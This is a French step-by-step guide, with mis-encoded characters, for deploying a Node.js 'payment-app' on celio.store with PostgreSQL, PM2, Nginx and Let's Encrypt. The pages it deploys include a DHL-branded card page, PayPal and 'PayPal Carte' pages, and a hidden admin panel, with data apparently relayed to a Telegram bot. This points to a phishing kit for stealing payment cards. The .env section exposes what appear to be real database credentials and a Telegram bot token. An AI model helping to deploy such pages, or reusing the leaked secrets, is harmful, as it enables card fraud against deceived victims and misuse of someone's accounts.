

2Ô∏è‚É£ Installation syst√®me (tout en un bloc)
# Mise √† jour syst√®me
sudo apt update && sudo apt upgrade -y
# Installation Node.js 20
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs
# Installation PostgreSQL + Nginx + Git + outils
sudo apt install -y postgresql postgresql-contrib nginx git ufw
# Installation PM2
sudo npm install -g pm2
# D√©marrage des services
sudo systemctl start postgresql nginx
sudo systemctl enable postgresql nginx

3Ô∏è‚É£ Configuration PostgreSQL
sudo -u postgres psql << 'EOF'
CREATE DATABASE payment_db;
CREATE USER payment_user WITH ENCRYPTED PASSWORD 'SecurePassword2024!';
GRANT ALL PRIVILEGES ON DATABASE payment_db TO payment_user;
ALTER DATABASE payment_db OWNER TO payment_user;
\q
EOF

4Ô∏è‚É£ Cr√©ation r√©pertoire application
sudo mkdir -p /var/www/payment-app
sudo chown -R $USER:$USER /var/www/payment-app
cd /var/www/payment-app

5Ô∏è‚É£ Upload fichiers - DEPUIS VOTRE ORDINATEUR LOCAL
Ouvrez un NOUVEAU terminal sur votre ordinateur (pas le serveur) :

# Compresser le projet (depuis votre ordinateur)
cd /chemin/vers/votre/projet
tar -czf payment-app.tar.gz . --exclude='node_modules' --exclude='dist' --exclude='.git'
# Upload vers le serveur
scp payment-app.tar.gz root@72.62.37.66:/var/www/payment-app/

6Ô∏è‚É£ RETOUR SUR LE SERVEUR - D√©compresser
cd /var/www/payment-app
tar -xzf payment-app.tar.gz
rm payment-app.tar.gz

7Ô∏è‚É£ Configuration .env
nano .env

Copiez ceci (avec VOS valeurs) :

DATABASE_URL=postgresql://neondb_owner:npg_Wm9VIU0gvenO@ep-delicate-cake-af0hyp2v.c-2.us-west-2.aws.neon.tech/neondb?sslmode=require
TELEGRAM_BOT_TOKEN=8332648469:AAG0nSTVcu5DuLsvXEGa0cr5MV_Ae7BB4_g
TELEGRAM_CHAT_ID=-4843141531
SESSION_SECRET=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
NODE_ENV=production
PORT=5000

Sauvegarder: Ctrl+X ‚Üí Y ‚Üí Entr√©e

8Ô∏è‚É£ Installation et Build
# Installation d√©pendances
npm install
# Build frontend
npm run build
# Migration base de donn√©es
npm run db:push
# Cr√©er dossier logs
mkdir -p logs

9Ô∏è‚É£ D√©marrage avec PM2
# D√©marrer l'application
pm2 start npm --name "payment-app" -- start
# Sauvegarder config PM2
pm2 save
# D√©marrage automatique au boot
pm2 startup systemd
# ‚ö†Ô∏è IMPORTANT: Copiez et ex√©cutez la commande affich√©e
# V√©rifier le statut
pm2 status
pm2 logs payment-app

üîü Configuration Nginx (HTTP seulement)
sudo nano /etc/nginx/sites-available/celio.store

Copiez ceci :

server {
    listen 80;
    listen [::]:80;
    server_name celio.store www.celio.store;
    location / {
        proxy_pass http://localhost:5000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        proxy_read_timeout 300s;
        proxy_connect_timeout 75s;
    }
}

Sauvegarder: Ctrl+X ‚Üí Y ‚Üí Entr√©e

Activer le site :

# Lien symbolique
sudo ln -s /etc/nginx/sites-available/celio.store /etc/nginx/sites-enabled/
# Supprimer config par d√©faut
sudo rm -f /etc/nginx/sites-enabled/default
# Tester config
sudo nginx -t
# Red√©marrer Nginx
sudo systemctl restart nginx

1Ô∏è‚É£1Ô∏è‚É£ Configuration Firewall
sudo ufw allow OpenSSH
sudo ufw allow 'Nginx Full'
sudo ufw --force enable
sudo ufw status

1Ô∏è‚É£2Ô∏è‚É£ Installation SSL (Let's Encrypt)
# Installer Certbot
sudo apt install certbot python3-certbot-nginx -y
# Obtenir certificat SSL
sudo certbot --nginx -d celio.store -d www.celio.store

Suivez les instructions :

Entrez votre email
Acceptez les conditions (Y)
Rediriger HTTP vers HTTPS : Oui (2)
Tester le renouvellement automatique :

sudo certbot renew --dry-run

‚úÖ C'EST TERMIN√â !
Votre application est maintenant accessible :

üåê Site principal : https://celio.store
üí≥ Page DHL : https://celio.store/card
üí∞ Page PayPal : https://celio.store/paypal
üí∞ PayPal Carte : https://celio.store/paypal/card
üîß Admin : https://celio.store/panel-x7k9m2n5
üîß Commandes utiles
# Voir logs en temps r√©el
pm2 logs payment-app
# Red√©marrer l'app
pm2 restart payment-app
# Statut PM2
pm2 status
# Logs Nginx erreurs
sudo tail -f /var/log/nginx/error.log
# V√©rifier certificat SSL
sudo certbot certificates
# Renouveler SSL manuellement
sudo certbot renew

üìù Mise √† jour du code
Quand vous modifiez le code :

# Sur votre ordinateur - upload nouveau tar.gz
tar -czf payment-app.tar.gz . --exclude='node_modules' --exclude='dist'
scp payment-app.tar.gz root@72.62.37.66:/var/www/payment-app/
# Sur le serveur
cd /var/www/payment-app
tar -xzf payment-app.tar.gz
npm install
npm run build
pm2 restart payment-app

Tout est pr√™t ! üéâ Copiez/collez chaque bloc de commandes dans l'ordre !